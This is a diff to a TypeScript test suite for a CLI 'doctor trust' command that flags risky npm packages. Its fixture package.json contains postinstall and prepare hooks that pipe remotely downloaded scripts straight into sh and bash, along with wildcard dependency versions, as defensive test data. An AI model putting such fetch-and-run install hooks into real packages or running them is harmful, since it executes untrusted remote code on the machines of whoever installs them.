@@ -34,9 +34,13 @@ async function createRiskyPackage(): Promise<string> {
         name: "risky-package",
         version: "1.0.0",
         scripts: {
-          postinstall: "curl https://example.com/install.sh | sh"
+          postinstall: "curl https://example.com/install.sh | sh",
+          prepare: "wget https://example.com/prepare.sh | bash"
         },
         dependencies: {
+          "left-pad": "*"
+        },
+        devDependencies: {
           "left-pad": "*"
         }
       },
@@ -50,6 +54,54 @@ async function createRiskyPackage(): Promise<string> {
 }
 
 describe("doctor trust command", () => {
+  it("distinguishes repeated script and dependency findings", async () => {
+    const targetPath = await createRiskyPackage();
+    const { io, stdout, stderr } = createIo();
+
+    const exitCode = await runCli(["doctor", "trust", targetPath, "--json"], io);
+    const output = JSON.parse(stdout.join(""));
+    const scriptFindings = output.findings.filter(
+      (finding: { id: string }) => finding.id === "trust.package.remote_pipe_install"
+    );
+    const dependencyFindings = output.findings.filter(
+      (finding: { id: string }) => finding.id === "trust.package.unpinned_dependency"
+    );
+
+    expect(exitCode).toBe(1);
+    expect(stderr).toEqual([]);
+    expect(scriptFindings.map((finding: { evidence: unknown }) => finding.evidence)).toEqual([
+      { packageJsonPath: "package.json", scriptName: "postinstall" },
+      { packageJsonPath: "package.json", scriptName: "prepare" }
+    ]);
+    expect(
+      dependencyFindings.map((finding: { evidence: unknown }) => finding.evidence)
+    ).toEqual([
+      {
+        packageJsonPath: "package.json",
+        dependencyName: "left-pad",
+        dependencySection: "dependencies",
+        versionSpec: "*"
+      },
+      {
+        packageJsonPath: "package.json",
+        dependencyName: "left-pad",
+        dependencySection: "devDependencies",
+        versionSpec: "*"
+      }
+    ]);
+    expect(
+      new Set(scriptFindings.map((finding: { fingerprint: string }) => finding.fingerprint))
+        .size
+    ).toBe(2);
+    expect(
+      new Set(
+        dependencyFindings.map(
+          (finding: { fingerprint: string }) => finding.fingerprint
+        )
+      ).size
+    ).toBe(2);
+  });
+
   it("renders finding fingerprints in text output", async () => {
     const targetPath = await createRiskyPackage();
     const { io, stdout, stderr } = createIo();
